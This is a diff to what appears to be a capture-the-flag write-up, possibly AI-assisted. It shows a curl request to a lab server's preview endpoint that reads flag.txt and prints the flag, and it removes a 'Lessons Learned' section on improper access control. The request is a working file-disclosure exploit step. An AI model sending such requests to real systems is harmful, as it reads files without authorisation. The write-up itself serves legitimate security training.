@@ -412,42 +412,17 @@ You're part of a security audit. Can you craft an upload that causes unintended 
 	💥 Success:  
 	Discovered file: `flag.txt [Status: 200]`
 
----
-
-4. Retrieved the Flag
-
+7. Retrieved the Flag
+	
 ```bash
 curl "http://68.183.205.254:34715/preview?file=flag.txt"
 ```
-
-📥 Output:
-
+	
+Output:
+	
 ```html
 <pre>h4kit{insecure_pipeline_exec_4212f73ceac2}</pre>
 ```
-
----
-
-### 🏁 Flag
-
-```
-h4kit{insecure_pipeline_exec_4212f73ceac2}
-```
-
----
-
-### 🧠 Lessons Learned
-
-- Even when upload interfaces block execution, **improper access control on file previews** can lead to **direct leakage**.
-    
-- Lack of filename sanitization or access control allowed a classic **predictable file access** vulnerability.
-    
-- Always test both the **upload** and **preview/browse** features when auditing for web-based file handling.
-    
-
----
-
-Let me know if you'd like this exported as a Markdown file or styled for blog/portfolio use.
 
 ### 🚩Flag Captured: 
 
